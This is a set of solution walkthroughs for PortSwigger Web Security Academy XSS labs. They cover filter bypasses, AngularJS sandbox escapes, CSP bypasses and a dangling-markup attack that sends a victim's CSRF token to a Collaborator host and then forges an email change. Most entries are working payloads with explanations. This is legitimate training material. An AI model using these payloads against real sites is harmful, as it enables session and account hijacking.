########### https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked

Visit the following URL, replacing YOUR-LAB-ID with your lab ID:

https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E 

########### https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked

Visit the following URL, replacing YOUR-LAB-ID with your lab ID:
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

The lab will be solved, but the alert will only be called if you click "Back to blog" at the bottom of the page.

The exploit uses exception handling to call the alert function with arguments. The throw statement is used, 
separated with a blank comment in order to get round the no spaces restriction. The alert function is assigned to the onerror exception handler.

As throw is a statement, it cannot be used as an expression. Instead, we need to use arrow functions to create a block so 
that the throw statement can be used. We then need to call this function, so we assign it to the toString property of window and trigger 
this by forcing a string conversion on window.

########### https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings

Visit the following URL, replacing YOUR-LAB-ID with your lab ID:
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. 
This effectively breaks the AngularJS sandbox. Next, an array is passed to the orderBy filter. We then set the argument for the filter 
by again using toString() to create a string and the String constructor property. Finally, we use the fromCharCode method generate 
our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, 
AngularJS will allow this code where normally it would not.

########### https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp

Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:
    <script>
    location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
    </script>
    
Click "Store" and "Deliver exploit to victim".

The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event, 
which is an AngularJS variable that references the event object. The path property is specific to Chrome and contains an array of elements 
that triggered the event. The last element in the array contains the window object.

Normally, | is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the orderBy filter. 
The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly,
we assign it to the variable z. The function will only be called when the orderBy operation reaches the window object in the $event.path array. 
This means it can be called in the scope of the window without an explicit reference to the window object, effectively bypassing AngularJS's window check.

########### https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack

Log in to the lab using the account provided above.
    
Examine the change email function. Observe that there is an XSS vulnerability in the email parameter.
    
Go to the Collaborator tab.
    
Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.

Back in the lab, go to the exploit server and add the following code, replacing YOUR-LAB-ID and YOUR-EXPLOIT-SERVER-ID with your lab ID and exploit server ID respectively, and replacing YOUR-COLLABORATOR-ID with the payload that you just copied from Burp Collaborator.
    <script>
    if(window.name) {
    	new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
    	} else {
    		location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
    }
    </script>
    
Click "Store" and then "Deliver exploit to victim". When the user visits the website containing this malicious script, 
if they click on the "Click me" link while they are still logged in to the lab website, their browser will send a request containing 
their CSRF token to your malicious website. You can then steal this CSRF token using the Burp Collaborator client.
    
Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. 
You should see an HTTP interaction that was initiated by the application. Select the HTTP interaction, go to the request tab, and copy the user's CSRF token.
    
With Burp's Intercept feature switched on, go back to the change email function of the lab and submit a request to 
change the email to any random address.
    
In Burp, go to the intercepted request and change the value of the email parameter to hacker@evil-user.net.
    
Right-click on the request and, from the context menu, select "Engagement tools" and then "Generate CSRF PoC". 
The popup shows both the request and the CSRF HTML that is generated by it. In the request, replace the CSRF token with the one 
that you stole from the victim earlier.
    
Click "Options" and make sure that the "Include auto-submit script" is activated.
    
Click "Regenerate" to update the CSRF HTML so that it contains the stolen token, then click "Copy HTML" to save it to your clipboard.
    
Drop the request and switch off the intercept feature.
   
 Go back to the exploit server and paste the CSRF HTML into the body. You can overwrite the script that we entered earlier.
    
Click "Store" and "Deliver exploit to victim". The user's email will be changed to hacker@evil-user.net.

########### https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass

Enter the following into the search box:
    <img src=1 onerror=alert(1)>
    
Observe that the payload is reflected, but the CSP prevents the script from executing.
    
In Burp Proxy, observe that the response contains a Content-Security-Policy header, and the report-uri directive 
contains a parameter called token. Because you can control the token parameter, you can inject your own CSP directives into the policy.

Visit the following URL, replacing YOUR-LAB-ID with your lab ID:
    https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27

The injection uses the script-src-elem directive in CSP. This directive allows you to target just script elements. 
Using this directive, you can overwrite existing script-src rules enabling you to inject unsafe-inline, which allows you to use inline scripts.







